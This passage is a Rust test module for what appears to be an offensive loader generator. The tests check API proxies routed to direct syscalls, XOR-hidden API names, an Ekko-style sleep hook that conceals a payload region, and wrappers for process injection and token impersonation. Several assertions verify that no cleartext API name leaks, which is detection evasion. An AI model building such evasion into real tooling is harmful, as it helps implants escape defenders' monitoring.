        let y = yaml(&format!(
            "mode: proxy\napis:\n{list}unmatched: {unmatched}\n"
        ));
        ApiResolutionConfig::from_yaml(Some(&y)).expect("valid")
    }

    /// The generated code with comment lines removed (comments may name APIs).
    fn code_only(source: &str) -> String {
        source
            .lines()
            .filter(|line| !line.trim_start().starts_with("//"))
            .collect::<Vec<_>>()
            .join("\n")
    }

    #[test]
    fn noop_block_when_nothing_is_proxied() {
        let block = render_block(&ApiResolutionConfig::default(), &xor_strings());
        assert!(block.contains("pub fn resolution_policy"));
        assert!(block.contains("crate::ImportPolicy::Forward"));
        assert!(!block.contains("proxy_0"));
    }

    #[test]
    fn renders_proxies_and_policy_without_cleartext_names() {
        let config = proxy_config(&["kernel32!ReadProcessMemory", "ntdll!NtReadVirtualMemory"]);
        let block = render_block(&config, &xor_strings());
        assert!(block.contains("proxy_0"));
        assert!(block.contains("proxy_1"));
        assert!(block.contains("fn resolution_policy"));
        assert!(block.contains("crate::ImportPolicy::Proxy("));
        assert!(block.contains("normalize_module"));
        assert!(block.contains("crate::nt_read_vm"));
        assert!(!block.contains('$'), "unsubstituted placeholder: {block}");
        let code = code_only(&block);
        assert!(!code.contains("ReadProcessMemory"), "cleartext name leaked");
        assert!(
            !code.contains("NtReadVirtualMemory"),
            "cleartext name leaked"
        );
    }

    #[test]
    fn forward_strategy_renders_a_runtime_resolver() {
        // No shipped catalogue entry uses `forward` any more (OpenProcess is a
        // rebuild, GetProcAddress is the handler); the strategy stays available
        // for future "thick" APIs, so it is exercised directly.
        let entry = ApiEntry {
            dll: "kernel32",
            func: "SomeThickApi",
            strategy: Strategy::Forward,
            nt: None,
        };
        let body = forward_proxy(0, &entry, &xor_strings(), "a: u32", "u32", "u32", "a");
        assert!(body.contains("original_0"));
        assert!(body.contains("GetModuleHandleA"));
        assert!(body.contains("OnceLock"));
        let code = code_only(&body);
        assert!(!code.contains("SomeThickApi"), "cleartext name leaked");
    }

    #[test]
    fn handler_entry_renders_the_module_lookup() {
        let config = proxy_config(&["kernel32!GetProcAddress"]);
        let block = render_block(&config, &xor_strings());
        assert!(block.contains("GetModuleFileNameA"));
        assert!(block.contains("resolution_policy(&path, func)"));
        assert!(block.contains("crate::ImportPolicy::Proxy("));
        assert!(block.contains("original_0"));
        assert!(!block.contains('$'), "unsubstituted placeholder: {block}");
    }

    /// `unmatched` picks the policy's miss arm: `forward` resolves normally,
    /// `abort` returns `ImportPolicy::Abort` so the load fails (finding 1).
    #[test]
    fn unmatched_selects_the_miss_decision() {
        let forward = proxy_config(&["kernel32!ReadProcessMemory"]);
        let block = render_block(&forward, &xor_strings());
        assert!(
            block.contains("crate::ImportPolicy::Forward")
                && !block.contains("ImportPolicy::Abort"),
            "forward should be the miss arm: {block}"
        );

        let abort = proxy_config_with_unmatched(&["kernel32!ReadProcessMemory"], "abort");
        let block = render_block(&abort, &xor_strings());
        assert!(
            block.contains("crate::ImportPolicy::Abort")
                && !block.contains("ImportPolicy::Forward"),
            "abort should be the miss arm: {block}"
        );
        assert!(!block.contains('$'), "unsubstituted placeholder: {block}");
    }

    #[test]
    fn rebuild_entry_defines_the_native_structures() {
        let config = proxy_config(&["kernel32!OpenProcess"]);
        let block = render_block(&config, &xor_strings());
        assert!(block.contains("struct ObjectAttributes"));
        assert!(block.contains("struct ClientId"));
        assert!(block.contains("OBJ_INHERIT"));
        assert!(block.contains("crate::nt_open_process"));
    }

    /// The process-memory wrappers rebuild the Win32 signatures on the native
    /// helpers and declare the syscall each one ends up calling.
    #[test]
    fn memory_and_handle_wrappers_route_to_the_native_helpers() {
        let config = proxy_config(&[
            "kernel32!VirtualAlloc",
            "kernel32!VirtualProtect",
            "kernel32!VirtualFree",
            "kernel32!CloseHandle",
            "kernel32!WaitForSingleObject",
        ]);
        assert_eq!(
            config.required_syscalls(),
            vec![
                "NtAllocateVirtualMemory",
                "NtProtectVirtualMemory",
                "NtFreeVirtualMemory",
                "NtClose",
                "NtWaitForSingleObject"
            ]
        );

        let block = render_block(&config, &xor_strings());
        for helper in [
            "crate::nt_alloc_vm",
            "crate::nt_protect_vm",
            "crate::nt_free_vm",
            "crate::nt_close",
            "crate::nt_wait_for_single_object_native",
        ] {
            assert!(block.contains(helper), "missing {helper}: {block}");
        }
        assert!(block.contains("current_process()"));
        assert!(block.contains("set_last_error("));
        assert!(!block.contains('$'), "leftover placeholder: {block}");

        let code = code_only(&block);
        for name in [
            "VirtualAlloc",
            "VirtualProtect",
            "VirtualFree",
            "CloseHandle",
            "WaitForSingleObject",
        ] {
            assert!(!code.contains(name), "cleartext name leaked: {name}");
        }
    }

    /// `NtFreeVirtualMemory` is also selectable as a direct `ntdll!` route.
    #[test]
    fn ntdll_free_route_renders_a_direct_proxy() {
        let config = proxy_config(&["ntdll!NtFreeVirtualMemory"]);
        assert_eq!(config.required_syscalls(), vec!["NtFreeVirtualMemory"]);
        let block = render_block(&config, &xor_strings());
        assert!(block.contains("extern \"system\" fn proxy_0"), "{block}");
        assert!(block.contains("crate::nt_free_vm"), "{block}");
        assert!(!block.contains('$'), "leftover placeholder: {block}");
    }

    /// The batch-2 wrappers: a query, a thread create (which also needs
    /// `ThreadBasicInformation`) and a token open.
    #[test]
    fn query_thread_and_token_wrappers_route_to_the_native_helpers() {
        let config = proxy_config(&[
            "kernel32!VirtualQuery",
            "kernel32!CreateThread",
            "advapi32!OpenThreadToken",
        ]);
        assert_eq!(
            config.required_syscalls(),
            vec![
                "NtQueryVirtualMemory",
                "NtCreateThreadEx",
                "NtQueryInformationThread",
                "NtOpenThreadToken"
            ]
        );

        let block = render_block(&config, &xor_strings());
        for helper in [
            "crate::nt_query_vm",
            "crate::nt_create_thread_ex_native",
            "crate::nt_query_info_thread",
            "crate::nt_open_thread_token",
        ] {
            assert!(block.contains(helper), "missing {helper}: {block}");
        }
        assert!(block.contains("ThreadBasicInformation"), "{block}");
        assert!(!block.contains('$'), "leftover placeholder: {block}");
        let code = code_only(&block);
        for name in ["VirtualQuery", "CreateThread", "OpenThreadToken"] {
            assert!(!code.contains(name), "cleartext name leaked: {name}");
        }
    }

    fn parse_api_resolution(yaml: &str) -> Result<ApiResolutionConfig> {
        let yaml: YamlApiResolutionPlan = serde_yml::from_str(yaml).expect("valid YAML");
        ApiResolutionConfig::from_yaml(Some(&yaml))
    }

    #[test]
    fn parses_the_sleep_hook_with_defaults() {
        let config = parse_api_resolution(
            "mode: proxy\nhooks:\n  sleep:\n    assume_single_threaded: true\n",
        )
        .expect("valid hook");
        let sleep = config.hooks.sleep.expect("the hook should be present");
        assert_eq!(sleep.min_ms, 1000);
        assert_eq!(sleep.max_ms, 600_000);
        assert!(!config.is_noop(), "a hook alone still installs a proxy");
    }

    #[test]
    fn parses_explicit_hook_values() {
        let config = parse_api_resolution(
            "mode: proxy\nhooks:\n  sleep:\n    min_ms: 2000\n    max_ms: 120000\n    assume_single_threaded: true\n",
        )
        .expect("valid hook");
        let sleep = config.hooks.sleep.expect("the hook should be present");
        assert_eq!(sleep.min_ms, 2000);
        assert_eq!(sleep.max_ms, 120_000);
    }

    #[test]
    fn hook_requires_the_single_thread_acknowledgement() {
        let err = parse_api_resolution("mode: proxy\nhooks:\n  sleep: {}\n")
            .expect_err("the hook must require the acknowledgement");
        assert!(err.to_string().contains("assume_single_threaded"));
    }

    #[test]
    fn hook_requires_proxy_mode() {
        let err = parse_api_resolution(
            "mode: none\nhooks:\n  sleep:\n    assume_single_threaded: true\n",
        )
        .expect_err("a hook without proxy mode must fail");
        assert!(err.to_string().contains("mode: proxy"));
    }

    #[test]
    fn hook_rejects_an_unimplemented_variant() {
        let err = parse_api_resolution(
            "mode: proxy\nhooks:\n  sleep:\n    obfuscate: foliage\n    assume_single_threaded: true\n",
        )
        .expect_err("a non-ekko variant must fail");
        assert!(err.to_string().contains("foliage"));
    }

    #[test]
    fn hook_rejects_an_inverted_window() {
        let err = parse_api_resolution(
            "mode: proxy\nhooks:\n  sleep:\n    min_ms: 5000\n    max_ms: 1000\n    assume_single_threaded: true\n",
        )
        .expect_err("min_ms > max_ms must fail");
        assert!(err.to_string().contains("greater than"));
    }

    /// With only a hook, the block still declares `NtDelayExecution`, proxies
    /// `Sleep` by function name (API-set imports name a virtual module) and
    /// never traces on the payload thread.
    #[test]
    fn a_hook_alone_renders_a_complete_proxy() {
        let config = parse_api_resolution(
            "mode: proxy\nhooks:\n  sleep:\n    assume_single_threaded: true\n",
        )
        .expect("valid hook");
        assert_eq!(config.required_syscalls(), vec!["NtDelayExecution"]);

        let block = render_block(&config, &xor_strings());
        assert!(
            block.contains("crate::sleep_runtime::ekko_sleep"),
            "{block}"
        );
        assert!(block.contains("crate::payload_region::get()"), "{block}");
        assert!(block.contains("crate::nt_delay_execution"), "{block}");
        assert!(block.contains("CONCEALING"), "{block}");
        assert!(block.contains("const MIN_MS: u32 = 1000;"), "{block}");
        assert!(block.contains("const MAX_MS: u32 = 600000;"), "{block}");
        assert!(
            !block.contains("want_module"),
            "the hook matches by function name only: {block}"
        );
        assert!(!block.contains('$'), "leftover placeholder: {block}");
        let code = code_only(&block);
        assert!(!code.contains("tech_dbg"), "the proxy traces: {code}");
        assert!(!code.contains("Sleep"), "the API name leaked: {code}");
    }

    #[test]
    fn every_catalogue_entry_has_a_proxy_body() {
        for entry in CATALOGUE {
            let body = proxy_body(0, entry, &xor_strings());
            assert!(
                code_only(&body).contains("proxy_0"),
                "no proxy body for {}",
                entry.selector()
            );
        }
    }

    #[test]
    fn required_syscalls_lists_the_route_targets() {
        let config = proxy_config(&[
            "kernel32!ReadProcessMemory",
            "ntdll!NtReadVirtualMemory",
            "kernel32!OpenProcess",
        ]);
        assert_eq!(
            config.required_syscalls(),
            vec!["NtReadVirtualMemory", "NtOpenProcess"]
        );
    }

    #[test]
    fn injection_entries_route_to_the_existing_syscalls() {
        let config = proxy_config(&[
            "kernel32!VirtualAllocEx",
            "kernel32!WriteProcessMemory",
            "kernel32!CreateRemoteThread",
            "kernel32!QueueUserAPC",
        ]);
        assert_eq!(
            config.required_syscalls(),
            vec![
                "NtAllocateVirtualMemory",
                "NtWriteVirtualMemory",
                "NtCreateThreadEx",
                "NtQueueApcThread"
            ]
        );

        let block = render_block(&config, &xor_strings());
        assert!(block.contains("crate::nt_alloc_vm"), "{block}");
        assert!(block.contains("crate::nt_write_vm"), "{block}");
        assert!(
            block.contains("crate::nt_create_thread_ex_native"),
            "{block}"
        );
        assert!(block.contains("crate::nt_queue_apc"), "{block}");
        assert!(!block.contains('$'), "leftover placeholder: {block}");
    }

    #[test]
    fn token_entries_route_to_the_new_syscalls() {
        let config = proxy_config(&[
            "advapi32!OpenProcessToken",
            "advapi32!DuplicateTokenEx",
            "advapi32!ImpersonateLoggedOnUser",
        ]);
        assert_eq!(
            config.required_syscalls(),
            vec![
                "NtOpenProcessToken",
                "NtDuplicateToken",
                "NtSetInformationThread"
            ]
        );

        let block = render_block(&config, &xor_strings());
        assert!(block.contains("crate::nt_open_process_token"), "{block}");
        assert!(block.contains("crate::nt_duplicate_token"), "{block}");
        assert!(block.contains("crate::nt_set_info_thread"), "{block}");
        assert!(!block.contains('$'), "leftover placeholder: {block}");
    }

    #[test]
    fn open_process_token_rebuild_calls_the_three_argument_native() {
        let config = proxy_config(&["advapi32!OpenProcessToken"]);
        let block = render_block(&config, &xor_strings());
        assert!(
            block.contains("crate::nt_open_process_token(process, desired_access, token)"),
            "{block}"
        );
    }

    #[test]
    fn duplicate_token_ex_does_not_pass_the_level_as_effective_only() {
        let config = proxy_config(&["advapi32!DuplicateTokenEx"]);
        let block = render_block(&config, &xor_strings());
        assert!(block.contains("_impersonation_level: i32"), "{block}");
        assert!(
            block.contains("core::ptr::null(),\n            0,\n            token_type,"),
            "{block}"
        );
    }

    #[test]
    fn injection_and_token_names_stay_out_of_the_code() {
        let config = proxy_config(&[
            "kernel32!VirtualAllocEx",
            "kernel32!CreateRemoteThread",
            "advapi32!DuplicateTokenEx",
        ]);
        let block = render_block(&config, &xor_strings());
        let code = code_only(&block);
        for name in ["VirtualAllocEx", "CreateRemoteThread", "DuplicateTokenEx"] {
            assert!(!code.contains(name), "cleartext name leaked: {name}");
        }
    }
}
